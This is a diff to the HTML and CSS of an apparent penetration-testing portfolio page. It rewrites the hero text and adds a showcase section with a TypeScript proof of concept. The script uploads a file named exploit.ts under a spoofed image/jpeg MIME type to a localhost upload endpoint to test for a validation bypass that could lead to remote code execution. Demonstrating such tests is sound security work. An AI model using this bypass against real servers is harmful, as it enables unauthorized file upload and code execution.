@@ -91,7 +91,7 @@
         .hero {
             background: linear-gradient(135deg, var(--primary-brand) 0%, #1A1D24 100%);
             color: #fff;
-            padding: 5rem 2rem;
+            padding: 4rem 2rem;
             text-align: center;
         }
 
@@ -265,6 +265,129 @@
         footer p {
             font-size: 0.9rem;
         }
+
+                /* Case in Point Section styles */
+        .case-in-point-container {
+            background-color: var(--light-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            padding: 2.5rem;
+            margin-top: 2rem;
+            margin-bottom: 4rem;
+            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.05);
+        }
+
+        .case-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            border-bottom: 2px solid var(--border-color);
+            padding-bottom: 1rem;
+            margin-bottom: 1.5rem;
+        }
+
+        .case-badge {
+            background-color: var(--secondary-brand);
+            color: #fff;
+            font-size: 0.75rem;
+            font-weight: 700;
+            padding: 0.25rem 0.75rem;
+            border-radius: 4px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .case-meta {
+            font-size: 0.9rem;
+            color: #4A5160;
+        }
+
+        .case-body h3 {
+            color: var(--primary-brand);
+            margin-bottom: 1rem;
+            font-size: 1.5rem;
+        }
+
+        .case-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 1.5rem;
+            margin-top: 1.5rem;
+        }
+
+        .case-block h4 {
+            color: var(--secondary-brand);
+            font-size: 1rem;
+            margin-bottom: 0.5rem;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .case-block p {
+            font-size: 0.95rem;
+            color: #4A5160;
+        }
+
+/* Code Sample Section Styling */
+.code-sample-section {
+    background-color: var(--light-bg);
+    padding: 4rem 2rem;
+}
+
+.code-card {
+    background-color: #1e1e2e; /* Dark IDE Theme Container */
+    border-radius: 8px;
+    border: 1px solid var(--border-color);
+    box-shadow: 0 8px 24px rgba(0, 0, 0, 0.12);
+    overflow: hidden;
+    max-width: 900px;
+    margin: 0 auto;
+}
+
+.code-header {
+    background-color: #181825;
+    padding: 0.75rem 1rem;
+    display: flex;
+    align-items: center;
+    gap: 0.5rem;
+    border-bottom: 1px solid #313244;
+}
+
+.dot {
+    width: 10px;
+    height: 10px;
+    border-radius: 50%;
+    display: inline-block;
+}
+
+.dot.red { background-color: #f38ba8; }
+.dot.yellow { background-color: #f9e2af; }
+.dot.green { background-color: #a6e3a1; }
+
+.file-name {
+    margin-left: 0.5rem;
+    font-size: 0.85rem;
+    color: #cdd6f4;
+    font-family: 'Courier New', Courier, monospace;
+}
+
+.code-card pre {
+    padding: 1.5rem;
+    overflow-x: auto;
+    font-family: 'Courier New', Courier, monospace;
+    font-size: 0.9rem;
+    line-height: 1.5;
+    color: #cdd6f4;
+}
+
+/* Syntax Highlighting Colors (Catppuccin Mocha Palette flavor) */
+.code-card .keyword { color: #cba6f7; font-weight: bold; }
+.code-card .type { color: #f9e2af; }
+.code-card .function { color: #89b4fa; }
+.code-card .string { color: #a6e3a1; }
+.code-card .comment { color: #6c7086; font-style: italic; }
+.code-card .number { color: #fab387; }
+
     </style>
 </head>
 <body>
@@ -285,11 +408,12 @@
     <!-- Hero Section -->
     <section class="hero">
         <div class="hero-container">
-            <h1>Learn to Master the Threat Landscape Through Rigorous Penetration Testing</h1>
-            <p>Uncovering enterprise vulnerabilities before malicious actors do. Explore advanced ethical hacking, threat hunting, and targeted offensive security operations.</p>
-            <a href="#contact" class="btn">Get in Touch</a>
+            <h1>Break things safely</h1>
+            <P>Simulate the attack.Find the weak link.</P>
         </div>
     </section>
+
+
 
     <!-- Capabilities / Core Areas -->
     <div class="container" id="expertise">
@@ -326,13 +450,91 @@
                 </div>
                 <a href="#contact" class="card-link">Learn More &rarr;</a>
             </div>
+
+            
+        </div>
+
+<!-- Code Sample Section -->
+<section class="code-sample-section" id="code-sample">
+    <h2 class="section-title">Case in Point - Automated Exploit & Validation Sample</h2>
+
+            <p class="section-subtitle">Command line runnable TypeScript exploit simulation. Snippet illustrating programmatic MIME-type spoofing and file-upload validation checks during API testing.</p>
+            
+            <div class="case-in-point-container">
+                <div class="case-header">
+                    <span class="case-badge">Phase 4 Simulation</span>
+                    <span class="case-meta">Target: API Image Upload handler<br>Runtime: Bun & TypeScript</span>
+                </div>
+                <div class="case-body">
+                    <h3>Arbitrary File Upload Leading to Remote Code Execution (RCE)</h3>
+                    <p>During a zero-knowledge application assessment, an unauthenticated entry point might allow uploading assets without standard verification logic. 
+                        Security validations might rely strictly on client-side properties, allowing structural bypasses.</p>
+                    
+
+                </div>
+
+    <div class="container">
+        
+        
+
+        <div class="code-card">
+            <div class="code-header">
+                <span class="dot red"></span>
+                <span class="dot yellow"></span>
+                <span class="dot green"></span>
+                <span class="file-name">exploit-validator.ts</span>
+            </div>
+            <pre><code class="language-typescript"><span class="comment">// 1. Define the target server URL and payload details</span>
+<span class="keyword">const</span> TARGET_URL = <span class="string">"http://localhost:3000/upload"</span>;
+<span class="keyword">const</span> SCRIPT_CONTENT = <span class="string">`console.log("RCE execution successful: server compromised.");`</span>;
+
+<span class="comment">// 2. Convert script content into a Blob with a faked image/jpeg content type</span>
+<span class="keyword">const</span> fakedImageBlob = <span class="keyword">new</span> <span class="type">Blob</span>([SCRIPT_CONTENT], { type: <span class="string">"image/jpeg"</span> });
+
+<span class="comment">// 3. Construct the multipart/form-data body</span>
+<span class="keyword">const</span> formData = <span class="keyword">new</span> <span class="type">FormData</span>();
+<span class="comment">// We name the file 'exploit.ts' but attach our spoofed MIME-type blob</span>
+formData.append(<span class="string">"image"</span>, fakedImageBlob, <span class="string">"exploit.ts"</span>);
+
+console.log(<span class="string">"⚡ Sending exploit payload with spoofed content type..."</span>);
+console.log(<span class="string">"→ Filename: exploit.ts"</span>);
+console.log(<span class="string">"→ Spoofed Type: image/jpeg"</span>);
+
+<span class="keyword">try</span> {
+  <span class="comment">// 4. Fire the intercepted/spoofed request to the server</span>
+  <span class="keyword">const</span> response = <span class="keyword">await</span> fetch(TARGET_URL, {
+    method: <span class="string">"POST"</span>,
+    body: formData, <span class="comment">// Bun automatically sets the proper boundary header</span>
+  });
+
+  <span class="keyword">const</span> result = <span class="keyword">await</span> response.json();
+  console.log(<span class="string">"\n📥 Server Response Received:"</span>);
+  console.log(JSON.stringify(result, <span class="keyword">null</span>, <span class="number">2</span>));
+
+  <span class="keyword">if</span> (result.status === <span class="string">"Success"</span>) {
+    console.log(<span class="string">"\n✅ Exploit successful! The server accepted a .ts file because it trusted the spoofed image/jpeg header."</span>);
+  } <span class="keyword">else</span> {
+    console.log(<span class="string">"\n❌ Exploit failed. The server rejected the payload."</span>);
+  }
+} <span class="keyword">catch</span> (error) {
+  console.error(<span class="string">"\n💥 Error connecting to the lab server:"</span>, error);
+}</code></pre>
         </div>
     </div>
+</section>
+
+
+
+    </div>
+
+
+
+
 
     <!-- Process / Methodology Section replacing Competencies -->
     <section class="credentials-section" id="credentials">
         <div class="credentials-header">
-            <h2 class="section-title">Web API Penetration Testing Methodology</h2>
+            <h2 class="section-title">Web API Penetration Testing Map</h2>
             <p class="section-subtitle">A comprehensive, end-to-end framework mapping scoping, threat discovery, vulnerability identification, and structured reporting.</p>
         </div>
         <div class="process-image-container">
